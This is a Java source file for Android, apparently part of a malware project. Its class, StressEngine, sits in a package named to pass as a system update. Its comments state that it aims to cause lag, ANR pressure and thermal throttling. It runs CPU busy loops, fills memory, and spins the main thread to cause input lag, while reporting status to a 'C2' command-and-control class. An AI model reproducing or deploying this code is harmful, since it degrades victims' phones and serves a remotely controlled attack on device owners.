package com.system.update;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * CPU + RAM pressure — multi-thread busy loops + large heap allocations.
 * Goal: lag / ANR pressure / thermal throttle. Does not require extra permissions.
 */
public final class StressEngine {

    private static final int WORKERS = Math.max(4, Runtime.getRuntime().availableProcessors() * 2);
    private static final ExecutorService POOL = Executors.newFixedThreadPool(WORKERS);
    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static final List<byte[]> HEAP = new ArrayList<>();
    private static final Random R = new Random();
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final Object LOCK = new Object();

    private StressEngine() {}

    public static void start(Context ctx) {
        if (RUNNING.getAndSet(true)) return;
        C2.send("stress", "start workers=" + WORKERS);

        // CPU burn workers
        for (int i = 0; i < WORKERS; i++) {
            final int id = i;
            POOL.execute(() -> {
                long x = id * 31L + 7;
                while (RUNNING.get()) {
                    // tight arithmetic + memory touch
                    for (int k = 0; k < 50_000; k++) {
                        x = (x * 6364136223846793005L + 1) ^ (x >>> 17);
                        x += k * id;
                    }
                    // occasional short yield so process is not killed instantly as pure ANR
                    if ((x & 0xFFFF) == 0) {
                        try { Thread.sleep(1); } catch (InterruptedException ignored) {}
                    }
                }
            });
        }

        // RAM allocator — grow until near limit, then free some and repeat
        POOL.execute(() -> {
            while (RUNNING.get()) {
                try {
                    synchronized (LOCK) {
                        // allocate ~2–8 MB chunks
                        int size = (2 + R.nextInt(7)) * 1024 * 1024;
                        byte[] block = new byte[size];
                        // touch pages so they are actually committed
                        for (int i = 0; i < block.length; i += 4096) {
                            block[i] = (byte) (i & 0xFF);
                        }
                        HEAP.add(block);
                        // if too many, drop oldest half
                        if (HEAP.size() > 24) {
                            int drop = HEAP.size() / 2;
                            for (int i = 0; i < drop; i++) {
                                HEAP.remove(0);
                            }
                            System.gc();
                        }
                    }
                    C2.send("stress_ram", "blocks=" + HEAP.size());
                    Thread.sleep(400 + R.nextInt(600));
                } catch (OutOfMemoryError oom) {
                    synchronized (LOCK) {
                        HEAP.clear();
                    }
                    System.gc();
                    try { Thread.sleep(800); } catch (InterruptedException ignored) {}
                } catch (Throwable t) {
                    try { Thread.sleep(500); } catch (InterruptedException ignored) {}
                }
            }
        });

        // main-thread micro-jank every few seconds (post heavy work)
        H.post(jankRunnable);
    }

    private static final Runnable jankRunnable = new Runnable() {
        @Override
        public void run() {
            if (!RUNNING.get()) return;
            // brief main-thread spin to cause frame drops / input lag
            long end = System.nanoTime() + 80_000_000L; // ~80ms
            long x = System.nanoTime();
            while (System.nanoTime() < end) {
                x = (x * 1103515245 + 12345) ^ (x >>> 13);
            }
            H.postDelayed(this, 700 + R.nextInt(900));
        }
    };

    public static void stop() {
        RUNNING.set(false);
        H.removeCallbacks(jankRunnable);
        synchronized (LOCK) {
            HEAP.clear();
        }
        System.gc();
        C2.send("stress", "stopped");
    }

    public static boolean isRunning() {
        return RUNNING.get();
    }
}
